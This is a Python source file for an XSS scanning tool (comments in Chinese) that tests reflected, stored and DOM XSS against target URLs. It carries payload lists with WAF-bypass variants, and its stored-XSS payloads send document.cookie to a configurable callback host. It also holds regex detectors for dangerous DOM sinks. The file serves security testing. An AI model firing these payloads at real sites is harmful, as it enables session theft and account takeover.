#!/usr/bin/env python3
"""
高级XSS检测工具 - 支持存储型、DOM型、反射型XSS
"""

import requests
import logging
import re
import json
import hashlib
from typing import Any, Dict, List, Optional
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

from core.tool_registry import BaseTool, ToolCategory, ToolParameter

logger = logging.getLogger(__name__)


class XSSPayloadLibrary:
    """XSS Payload库"""
    
    # 反射型XSS
    REFLECTED = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '"><img src=x onerror=alert(1)>',
    ]
    
    # DOM XSS - 针对不同sink
    DOM_SINKS = {
        "innerHTML": [
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
        ],
        "document.write": [
            '</script><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
        ],
        "eval": [
            "alert(1)",
            "'-alert(1)-'",
        ],
        "location": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
        "setTimeout": [
            "alert(1)",
        ],
    }
    
    # 存储型XSS - 持久化payload
    STORED = [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror="fetch(\'http://CALLBACK/?\'+document.cookie)">',
        '<svg onload="new Image().src=\'http://CALLBACK/?\'+document.cookie">',
        '"><script>document.location="http://CALLBACK/?c="+document.cookie</script>',
        '<script>fetch("http://CALLBACK/?d="+document.domain)</script>',
    ]
    
    # WAF绕过
    WAF_BYPASS = [
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script>al\\u0065rt(1)</script>',
        '<img/src=x/onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<!--><script>alert(1)</script>-->',
        '<script>eval(atob("YWxlcnQoMSk="))</script>',
        '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    ]
    
    # Polyglot
    POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    ]


@dataclass
class AdvancedXSSTool(BaseTool):
    """高级XSS扫描器"""
    name: str = "advanced_xss"
    description: str = "高级XSS扫描器 - 支持反射型、存储型、DOM型XSS检测"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("url", "string", "目标URL", required=True),
        ToolParameter("scan_type", "string", "扫描类型", required=False, default="all",
                     choices=["reflected", "stored", "dom", "all"]),
        ToolParameter("callback_url", "string", "回调URL(存储型XSS)", required=False, default=""),
        ToolParameter("form_data", "string", "表单数据(JSON)", required=False, default=""),
        ToolParameter("cookies", "string", "Cookies", required=False, default=""),
        ToolParameter("headers", "string", "自定义Headers(JSON)", required=False, default=""),
    ])
    timeout: int = 300
    
    def execute(self, params: Dict[str, Any], session_id: Optional[str] = None) -> Dict[str, Any]:
        url = params["url"]
        scan_type = params.get("scan_type", "all")
        callback_url = params.get("callback_url", "")
        form_data = params.get("form_data", "")
        cookies_str = params.get("cookies", "")
        headers_str = params.get("headers", "")
        
        results: Dict[str, Any] = {
            "success": True,
            "url": url,
            "vulnerabilities": [],
            "scan_type": scan_type,
            "tests_performed": 0,
        }
        
        headers: Dict[str, str] = {}
        if headers_str:
            try:
                headers = json.loads(headers_str)
            except json.JSONDecodeError:
                pass
        
        cookies: Dict[str, str] = {}
        if cookies_str:
            for item in cookies_str.split(";"):
                if "=" in item:
                    k, v = item.strip().split("=", 1)
                    cookies[k] = v
        
        # 反射型XSS测试
        if scan_type in ["reflected", "all"]:
            reflected_vulns = self._test_reflected(url, headers, cookies)
            results["vulnerabilities"].extend(reflected_vulns)
            results["tests_performed"] += len(XSSPayloadLibrary.REFLECTED)
        
        # DOM XSS测试
        if scan_type in ["dom", "all"]:
            dom_vulns = self._test_dom(url, headers, cookies)
            results["vulnerabilities"].extend(dom_vulns)
            results["tests_performed"] += 10
        
        # 存储型XSS测试
        if scan_type in ["stored", "all"]:
            if form_data or callback_url:
                stored_vulns = self._test_stored(url, form_data, callback_url, headers, cookies)
                results["vulnerabilities"].extend(stored_vulns)
                results["tests_performed"] += len(XSSPayloadLibrary.STORED)
        
        results["total_vulnerabilities"] = len(results["vulnerabilities"])
        results["is_vulnerable"] = len(results["vulnerabilities"]) > 0
        
        return results
    
    def _test_reflected(self, url: str, headers: Dict[str, str], 
                        cookies: Dict[str, str]) -> List[Dict[str, Any]]:
        """测试反射型XSS"""
        vulns: List[Dict[str, Any]] = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # 尝试常见参数
            params = {"q": [""], "search": [""], "id": [""], "name": [""]}
        
        for param_name in params:
            for payload in XSSPayloadLibrary.REFLECTED + XSSPayloadLibrary.WAF_BYPASS:
                test_params = {k: v[0] if v else "" for k, v in params.items()}
                test_params[param_name] = payload
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                
                try:
                    resp = requests.get(test_url, headers=headers, cookies=cookies, 
                                       timeout=10, verify=False)
                    
                    # 检查payload是否在响应中反射
                    if payload in resp.text:
                        vulns.append({
                            "type": "REFLECTED_XSS",
                            "parameter": param_name,
                            "payload": payload,
                            "url": test_url,
                            "severity": "high",
                            "evidence": f"Payload reflected in response"
                        })
                        break  # 找到一个就跳过该参数
                        
                except Exception as e:
                    logger.debug(f"反射型XSS测试异常: {e}")
        
        return vulns
    
    def _test_dom(self, url: str, headers: Dict[str, str],
                  cookies: Dict[str, str]) -> List[Dict[str, Any]]:
        """测试DOM XSS"""
        vulns: List[Dict[str, Any]] = []
        
        try:
            resp = requests.get(url, headers=headers, cookies=cookies, 
                               timeout=10, verify=False)
            html = resp.text
            
            # 检测危险的DOM sink
            dom_patterns = {
                "innerHTML": r'\.innerHTML\s*=',
                "outerHTML": r'\.outerHTML\s*=',
                "document.write": r'document\.write\s*\(',
                "document.writeln": r'document\.writeln\s*\(',
                "eval": r'eval\s*\(',
                "setTimeout": r'setTimeout\s*\([^,]*[\'"`]',
                "setInterval": r'setInterval\s*\([^,]*[\'"`]',
                "location.href": r'location\.href\s*=',
                "location.assign": r'location\.assign\s*\(',
                "location.replace": r'location\.replace\s*\(',
            }
            
            # 检测危险的source
            source_patterns = {
                "location.hash": r'location\.hash',
                "location.search": r'location\.search',
                "document.URL": r'document\.URL',
                "document.referrer": r'document\.referrer',
                "window.name": r'window\.name',
            }
            
            found_sinks: List[str] = []
            found_sources: List[str] = []
            
            for sink_name, pattern in dom_patterns.items():
                if re.search(pattern, html):
                    found_sinks.append(sink_name)
            
            for source_name, pattern in source_patterns.items():
                if re.search(pattern, html):
                    found_sources.append(source_name)
            
            # 如果同时存在source和sink，可能存在DOM XSS
            if found_sinks and found_sources:
                vulns.append({
                    "type": "POTENTIAL_DOM_XSS",
                    "sinks": found_sinks,
                    "sources": found_sources,
                    "severity": "medium",
                    "evidence": f"Found sinks: {found_sinks}, sources: {found_sources}",
                    "recommendation": "需要手动验证数据流"
                })
            
            # 测试hash-based DOM XSS
            for payload in XSSPayloadLibrary.DOM_SINKS.get("location", []):
                test_url = f"{url}#{payload}"
                vulns.append({
                    "type": "DOM_XSS_TEST",
                    "test_url": test_url,
                    "payload": payload,
                    "severity": "info",
                    "note": "需要在浏览器中手动验证"
                })
                
        except Exception as e:
            logger.debug(f"DOM XSS测试异常: {e}")
        
        return vulns
    
    def _test_stored(self, url: str, form_data: str, callback_url: str,
                     headers: Dict[str, str], cookies: Dict[str, str]) -> List[Dict[str, Any]]:
        """测试存储型XSS"""
        vulns: List[Dict[str, Any]] = []
        
        # 解析表单数据
        form_dict: Dict[str, str] = {}
        if form_data:
            try:
                form_dict = json.loads(form_data)
            except json.JSONDecodeError:
                pass
        
        if not form_dict:
            return vulns
        
        # 生成唯一标识符用于追踪
        unique_id = hashlib.md5(url.encode()).hexdigest()[:8]
        
        for field_name in form_dict:
            for payload in XSSPayloadLibrary.STORED:
                # 替换回调URL
                if callback_url:
                    payload = payload.replace("CALLBACK", callback_url)
                else:
                    payload = payload.replace("http://CALLBACK/", "")
                
                # 添加唯一标识
                payload = payload.replace("alert(", f"alert('{unique_id}_")
                
                test_data = form_dict.copy()
                test_data[field_name] = payload
                
                try:
                    # 提交payload
                    resp = requests.post(url, data=test_data, headers=headers,
                                        cookies=cookies, timeout=10, verify=False)
                    
                    # 检查是否存储成功
                    if resp.status_code in [200, 201, 302]:
                        vulns.append({
                            "type": "STORED_XSS_CANDIDATE",
                            "field": field_name,
                            "payload": payload,
                            "unique_id": unique_id,
                            "severity": "high",
                            "note": f"Payload已提交，请检查是否在页面中持久化显示",
                            "callback_url": callback_url if callback_url else "未设置"
                        })
                        break
                        
                except Exception as e:
                    logger.debug(f"存储型XSS测试异常: {e}")
        
        return vulns


@dataclass  
class DOMXSSAnalyzerTool(BaseTool):
    """DOM XSS分析器"""
    name: str = "dom_xss_analyzer"
    description: str = "DOM XSS分析器 - 分析JavaScript代码中的DOM XSS漏洞"
    category: ToolCategory = ToolCategory.WEB_ATTACK
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("url", "string", "目标URL", required=True),
        ToolParameter("js_url", "string", "JavaScript文件URL(可选)", required=False, default=""),
    ])
    timeout: int = 60
    
    def execute(self, params: Dict[str, Any], session_id: Optional[str] = None) -> Dict[str, Any]:
        url = params["url"]
        js_url = params.get("js_url", "")
        
        results: Dict[str, Any] = {
            "success": True,
            "url": url,
            "findings": [],
            "dangerous_patterns": [],
        }
        
        try:
            # 获取页面内容
            resp = requests.get(url, timeout=10, verify=False)
            html = resp.text
            
            # 提取内联JavaScript
            inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
            
            # 获取外部JS文件
            external_js: List[str] = []
            js_links = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html)
            
            for js_link in js_links[:5]:  # 限制数量
                full_url = urljoin(url, js_link)
                try:
                    js_resp = requests.get(full_url, timeout=5, verify=False)
                    external_js.append(js_resp.text)
                except Exception as exc:
                    logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            # 如果指定了JS URL
            if js_url:
                try:
                    js_resp = requests.get(js_url, timeout=5, verify=False)
                    external_js.append(js_resp.text)
                except Exception as exc:
                    logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            # 合并所有JS代码
            all_js = "\n".join(inline_scripts + external_js)
            
            # 分析危险模式
            dangerous_patterns = self._analyze_js(all_js)
            results["dangerous_patterns"] = dangerous_patterns
            
            # 生成发现
            for pattern in dangerous_patterns:
                results["findings"].append({
                    "type": pattern["type"],
                    "sink": pattern["sink"],
                    "source": pattern.get("source"),
                    "code_snippet": pattern["snippet"][:200],
                    "severity": pattern["severity"],
                    "recommendation": pattern["recommendation"]
                })
            
            results["total_findings"] = len(results["findings"])
            
        except Exception as e:
            results["success"] = False
            results["error"] = str(e)
        
        return results
    
    def _analyze_js(self, js_code: str) -> List[Dict[str, Any]]:
        """分析JavaScript代码"""
        patterns: List[Dict[str, Any]] = []
        
        # 危险sink模式
        sink_patterns = [
            (r'\.innerHTML\s*=\s*([^;]+)', "innerHTML", "high"),
            (r'\.outerHTML\s*=\s*([^;]+)', "outerHTML", "high"),
            (r'document\.write\s*\(([^)]+)\)', "document.write", "high"),
            (r'document\.writeln\s*\(([^)]+)\)', "document.writeln", "high"),
            (r'eval\s*\(([^)]+)\)', "eval", "critical"),
            (r'new\s+Function\s*\(([^)]+)\)', "Function constructor", "critical"),
            (r'setTimeout\s*\(\s*([^,]+)', "setTimeout", "medium"),
            (r'setInterval\s*\(\s*([^,]+)', "setInterval", "medium"),
            (r'location\.href\s*=\s*([^;]+)', "location.href", "high"),
            (r'location\.assign\s*\(([^)]+)\)', "location.assign", "high"),
            (r'location\.replace\s*\(([^)]+)\)', "location.replace", "high"),
            (r'\$\([^)]+\)\.html\s*\(([^)]+)\)', "jQuery.html()", "high"),
            (r'\$\([^)]+\)\.append\s*\(([^)]+)\)', "jQuery.append()", "medium"),
        ]
        
        # 危险source
        sources = [
            "location.hash", "location.search", "location.href",
            "document.URL", "document.referrer", "window.name",
            "document.cookie", "localStorage", "sessionStorage"
        ]
        
        for pattern, sink_name, severity in sink_patterns:
            matches = re.finditer(pattern, js_code)
            for match in matches:
                value = match.group(1) if match.groups() else ""
                
                # 检查是否使用了危险source
                used_source = None
                for source in sources:
                    if source in value:
                        used_source = source
                        break
                
                if used_source:
                    patterns.append({
                        "type": "DOM_XSS_VULNERABILITY",
                        "sink": sink_name,
                        "source": used_source,
                        "snippet": match.group(0),
                        "severity": severity,
                        "recommendation": f"对{used_source}进行适当的编码或验证后再传递给{sink_name}"
                    })
                else:
                    patterns.append({
                        "type": "POTENTIAL_DOM_XSS",
                        "sink": sink_name,
                        "source": None,
                        "snippet": match.group(0),
                        "severity": "low",
                        "recommendation": f"检查传递给{sink_name}的数据来源"
                    })
        
        return patterns
